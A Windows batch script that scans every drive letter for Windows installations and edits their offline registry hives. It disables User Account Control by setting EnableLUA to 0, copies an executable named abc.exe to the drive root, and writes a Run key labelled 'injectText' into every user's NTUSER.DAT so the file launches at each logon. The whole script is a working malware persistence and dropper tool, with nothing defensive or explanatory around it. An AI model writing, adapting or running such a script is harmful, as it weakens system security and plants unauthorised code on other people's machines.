@echo off
goto :main

:disable_UAC
  echo %~1
  reg load HKLM\tuana20 %~1:\Windows\System32\config\SOFTWARE
  reg add HKLM\tuana20\Microsoft\Windows\CurrentVersion\Policies\System /f /v EnableLUA /t REG_DWORD /d 0
  reg unload HKLM\tuana20
 goto :eof

:scan_users
setlocal
    for %%D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
        if exist "%%D:\Windows" (
            call :disable_UAC %%D
            for /F "delims=" %%a in ('dir %%D:\Users\ /b') do (
                if "%%a" NEQ "Public" call :inject_reg %%D %%a
            )
        )
    )
endlocal
goto :eof

:inject_reg
	copy /b abc.exe %~1:\abc.exe /Y /V /Z
    reg load HKU\tuana20\ %~1:\Users\%~2\NTUSER.DAT
    reg add HKU\tuana20\Software\Microsoft\Windows\CurrentVersion\Run /f /v injectText /t REG_SZ /d "C:\abc.exe" 
    reg unload HKU\tuana20
goto :eof
:main
    call :scan_users
    pause
goto :eof